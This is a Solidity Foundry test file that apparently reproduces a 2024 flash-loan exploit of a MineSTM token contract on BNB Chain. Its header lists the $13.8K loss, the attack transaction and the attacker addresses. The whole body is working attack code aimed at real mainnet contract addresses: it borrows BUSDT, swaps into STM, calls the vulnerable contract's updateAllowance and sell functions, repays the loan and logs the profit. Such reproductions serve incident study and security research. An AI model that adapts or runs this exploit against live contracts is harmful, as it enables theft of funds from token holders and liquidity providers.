// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 	$13.8K
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x849ed7f687cc2ebd1f7c4bed0849893e829a74f512b7f4a18aea39a3ef4d83b1
// Attacker Address : https://bscscan.com/address/0x40a82dfdbf01630ea87a0372cf95fa8636fcad89
// Attack Contract : https://bscscan.com/address/0x88c17622d33b327268924e9f90a9e475a244e3ab

// @Analysis: https://x.com/0xNickLFranklin/status/1798920774511898862

interface IMineSTM {
    function updateAllowance() external;

    function sell(uint256) external;

}

contract ContractTest is Test {

    Uni_Pair_V3 constant BUSDT_USDC = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 STM = IERC20(0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0);
    Uni_Pair_V2 constant BUSDT_STM = Uni_Pair_V2(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);
    Uni_Router_V2 constant ROUTER = Uni_Router_V2(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);
    uint256 flashBUSDTAmount = 50000 ether;
    IMineSTM mineSTM = IMineSTM(0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6);


    function setUp() public {
        vm.createSelectFork("bsc", 39383150 - 1);
    }

    function testExploit() public {

        
        BUSDT_USDC.flash(
            address(this), 
            flashBUSDTAmount, 
            0, 
            abi.encodePacked(uint256(1))
        );

         emit log_named_decimal_uint("Profit: ", BUSDT.balanceOf(address(this)), 18);

    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        BUSDT_STM.sync();
        BUSDT.approve(address(ROUTER), flashBUSDTAmount);

        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(STM);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            flashBUSDTAmount,
            0,
            path,
            address(this),
            block.timestamp
        
        );

        STM.approve(address(mineSTM), type(uint256).max);
        mineSTM.updateAllowance();
        mineSTM.sell(81);
        mineSTM.sell(7);

        BUSDT.transfer(msg.sender, flashBUSDTAmount * 10001 / 10000);
        
    }



    receive() external payable {}

}